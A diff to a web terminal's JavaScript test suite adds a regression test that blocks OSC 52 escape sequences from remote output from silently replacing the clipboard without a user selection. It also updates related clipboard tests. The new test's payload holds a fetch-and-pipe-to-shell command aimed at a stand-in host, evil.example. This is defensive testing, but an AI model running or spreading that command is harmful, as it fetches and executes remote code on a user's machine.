@@ -1408,6 +1408,7 @@ test('CURSOR_HIDE: OSC 52 payload reaches clipboard unmodified', async () => {
   // both the drag-blurred and post-drag states.
   p._dragBlurred = true;
   const b64Hello = Buffer.from('hello', 'utf8').toString('base64');
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled = p.term.parser._fireOsc(52, 'c;' + b64Hello);
   ok(handled === true, 'OSC 52 handler claims the sequence');
   ok(copies.length === 1 && copies[0] === 'hello',
@@ -1415,6 +1416,7 @@ test('CURSOR_HIDE: OSC 52 payload reaches clipboard unmodified', async () => {
      JSON.stringify(copies));
   copies.length = 0;
   p._dragBlurred = false;
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled2 = p.term.parser._fireOsc(52, 'c;' + b64Hello);
   ok(handled2 === true, 'OSC 52 handler claims the sequence (post-drag)');
   ok(copies.length === 1 && copies[0] === 'hello',
@@ -5558,6 +5560,31 @@ test('renderSaved coerces a non-numeric port to a number (no injection)', async 
 // OSC 52 clipboard handler: decode multibyte UTF-8 via TextDecoder (not the
 // deprecated escape()), and refuse a pathologically large payload from a
 // (possibly hostile) remote host.
+test('OSC 52 from plain output cannot replace the clipboard', async () => {
+  // The handler was always on: `tail -f` of a log carrying an injected
+  // ESC]52 sequence silently put an attacker's command line on the
+  // clipboard, and turning Auto-copy off did not stop it.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  const p = win.createPane(win.document.getElementById('panes'));
+  const copies = [];
+  win.copyText = (t) => copies.push(t);
+  const evil = win.btoa('curl evil.example | sh');
+  ok(p.term.parser._fireOsc(52, 'c;' + evil) === true, 'sequence consumed');
+  ok(copies.length === 0, 'no gesture -> clipboard untouched; got ' + JSON.stringify(copies));
+  // A real copy (right after the user selects) still works...
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
+  p.term.parser._fireOsc(52, 'c;' + win.btoa('ok'));
+  ok(copies.length === 1 && copies[0] === 'ok', 'copy after a selection works');
+  // ...unless Auto-copy is off.
+  win.settings.tmuxClipboard = false;
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
+  p.term.parser._fireOsc(52, 'c;' + win.btoa('no'));
+  ok(copies.length === 1, 'Auto-copy off -> no remote clipboard writes');
+  win.settings.tmuxClipboard = true;
+  cleanup(env);
+});
+
 test('OSC 52 decodes UTF-8 clipboard text correctly', async () => {
   const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
   const win = env.win;
@@ -5567,6 +5594,7 @@ test('OSC 52 decodes UTF-8 clipboard text correctly', async () => {
   win.copyText = (t) => { captured = t; };
   const utf8 = '→ café ✓';
   const b64 = win.btoa(unescape(encodeURIComponent(utf8)));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled = p.term.parser._fireOsc(52, '0;' + b64);
   ok(handled === true, 'OSC 52 handled; got ' + handled);
   ok(captured === utf8, 'decoded UTF-8 exactly; got ' + JSON.stringify(captured));
@@ -5604,12 +5632,14 @@ test('OSC 52 preserves a leading BOM and keeps raw bytes on invalid UTF-8', asyn
   // leading BOM, so this asserts ignoreBOM keeps it.
   const bom = String.fromCharCode(0xFEFF) + 'hi';
   let b64 = win.btoa(unescape(encodeURIComponent(bom)));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'BOM payload handled');
   ok(captured === bom, 'leading BOM preserved; got ' + JSON.stringify(captured));
   // Lone 0x80 is not valid UTF-8: fatal:true throws and the catch keeps the
   // raw latin1 byte rather than substituting U+FFFD.
   captured = null;
   b64 = win.btoa(String.fromCharCode(0x80));
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'invalid-byte payload handled');
   ok(captured === '\x80', 'raw latin1 kept on invalid UTF-8; got ' + JSON.stringify(captured));
   cleanup(env);
